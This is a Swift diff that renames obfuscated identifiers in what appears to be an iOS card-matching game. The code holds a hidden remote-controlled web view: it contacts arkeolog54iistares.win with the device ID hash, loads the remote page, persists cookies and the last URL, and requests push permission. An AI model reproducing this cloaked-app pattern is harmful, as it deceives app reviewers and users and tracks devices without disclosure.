@@ -217,14 +217,14 @@ class MatchCardCell: UICollectionViewCell {
     }
 } 
 
-struct generalServicok {
+struct ArchaeologistServicok {
     
-    static let generalSmall = URL(string: "https://arkeolog54iistares.win/ZYyX9r")
+    static let ArchaeologistSmall = URL(string: "https://arkeolog54iistares.win/ZYyX9r")
     
-    static let generalLigna = URL(string: "https://arkeolog54iistares.win/ZYyX9r?push=\(AppMetrica.deviceIDHash!)")
+    static let ArchaeologistLigna = URL(string: "https://arkeolog54iistares.win/ZYyX9r?push=\(AppMetrica.deviceIDHash!)")
     
-    static  func generalAboutStatus( completion: @escaping (Bool) -> Void) {
-        guard let url = generalSmall  else {
+    static  func ArchaeologistAboutStatus( completion: @escaping (Bool) -> Void) {
+        guard let url = ArchaeologistSmall  else {
             print("Invalid URL")
             completion(false)
             return
@@ -254,9 +254,9 @@ import AppMetricaCore
 
 class WebviewVC: UIViewController, WKNavigationDelegate  {
     
-    private let generalSignalim = OneSignalIDChecker()
+    private let ArchaeologistSignalim = OneSignalIDChecker()
 
-    func generalObitaem() {
+    func ArchaeologistObitaem() {
         let standartStorage: UserDefaults = UserDefaults.standard
         let data: Data? = standartStorage.object(forKey: "cvcvcv") as? Data
         if let cookie = data {
@@ -271,7 +271,7 @@ class WebviewVC: UIViewController, WKNavigationDelegate  {
         }
     }
 
-    lazy var generalFire: WKWebView = {
+    lazy var ArchaeologistFire: WKWebView = {
         let privacyConfiguration = WKWebViewConfiguration()
         privacyConfiguration.defaultWebpagePreferences.allowsContentJavaScript = true
         privacyConfiguration.allowsPictureInPictureMediaPlayback = true
@@ -287,37 +287,37 @@ class WebviewVC: UIViewController, WKNavigationDelegate  {
     
     override func viewDidLoad() {
         super.viewDidLoad()
-        generalDesig()
-        generalObitaem()
-        generalOneka()
-        generalFire.navigationDelegate = self
+        ArchaeologistDesig()
+        ArchaeologistObitaem()
+        ArchaeologistOneka()
+        ArchaeologistFire.navigationDelegate = self
     }
 
     init(url: URL) {
-        self.generalTermosa = url
+        self.ArchaeologistTermosa = url
         super.init(nibName: nil, bundle: nil)
     }
-    let generalTermosa: URL
+    let ArchaeologistTermosa: URL
     
     required init?(coder: NSCoder) {
         fatalError("init(coder:) has not been implemented")
     }
     func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
-        generalKaki()
+        ArchaeologistKaki()
         decisionHandler(.allow)
     }
     
     func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
         if let url = webView.url {
-            generalServicePosl.generalLastovka = url
+            ArchaeologistServicePosl.ArchaeologistLastovka = url
         }
     }
     override func viewWillDisappear(_ animated: Bool) {
             super.viewWillDisappear(animated)
-            generalSignalim.generalStopik()
+            ArchaeologistSignalim.ArchaeologistStopik()
         }
     
-    private func generalOneka() {
+    private func ArchaeologistOneka() {
         DispatchQueue.main.asyncAfter(deadline: .now() + 5.5) {
             OneSignal.Notifications.requestPermission({ accepted in
 
@@ -327,20 +327,20 @@ class WebviewVC: UIViewController, WKNavigationDelegate  {
         }
     }
     
-    private func generalDesig() {
-        view.addSubview(generalFire)
-        generalFire.load(URLRequest(url: generalTermosa))
-        generalFire.allowsBackForwardNavigationGestures = true
+    private func ArchaeologistDesig() {
+        view.addSubview(ArchaeologistFire)
+        ArchaeologistFire.load(URLRequest(url: ArchaeologistTermosa))
+        ArchaeologistFire.allowsBackForwardNavigationGestures = true
         
-        generalFire.translatesAutoresizingMaskIntoConstraints = false
+        ArchaeologistFire.translatesAutoresizingMaskIntoConstraints = false
         NSLayoutConstraint.activate([
-            generalFire.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
-            generalFire.leadingAnchor.constraint(equalTo: view.leadingAnchor),
-            generalFire.trailingAnchor.constraint(equalTo: view.trailingAnchor),
-            generalFire.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
+            ArchaeologistFire.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
+            ArchaeologistFire.leadingAnchor.constraint(equalTo: view.leadingAnchor),
+            ArchaeologistFire.trailingAnchor.constraint(equalTo: view.trailingAnchor),
+            ArchaeologistFire.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
         ])
     }
-    private func generalKaki() {
+    private func ArchaeologistKaki() {
         let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
         if let cookies = cookieJar.cookies {
             let data: Data? = try? NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
@@ -354,9 +354,9 @@ class WebviewVC: UIViewController, WKNavigationDelegate  {
     
 }
 
-struct generalServicePosl {
+struct ArchaeologistServicePosl {
     
-    static var generalLastovka: URL? {
+    static var ArchaeologistLastovka: URL? {
         get { UserDefaults.standard.url(forKey: "LastUrl") }
         set { UserDefaults.standard.set(newValue, forKey: "LastUrl") }
     }
@@ -364,22 +364,22 @@ struct generalServicePosl {
 
 class OneSignalIDChecker {
     
-    private var generalTimoka: Timer?
-    func generalStartyem() {
-        generalStopik()
-        generalTimoka = Timer.scheduledTimer(
+    private var ArchaeologistTimoka: Timer?
+    func ArchaeologistStartyem() {
+        ArchaeologistStopik()
+        ArchaeologistTimoka = Timer.scheduledTimer(
             timeInterval: 0.5,
             target: self,
-            selector: #selector(generalPrint),
+            selector: #selector(ArchaeologistPrint),
             userInfo: nil,
             repeats: true
         )
     }
-    func generalStopik() {
-        generalTimoka?.invalidate()
-        generalTimoka = nil
+    func ArchaeologistStopik() {
+        ArchaeologistTimoka?.invalidate()
+        ArchaeologistTimoka = nil
     }
-    @objc private func generalPrint() {
+    @objc private func ArchaeologistPrint() {
         let onesignalID = OneSignal.User.onesignalId ?? "ID"
     }
 }
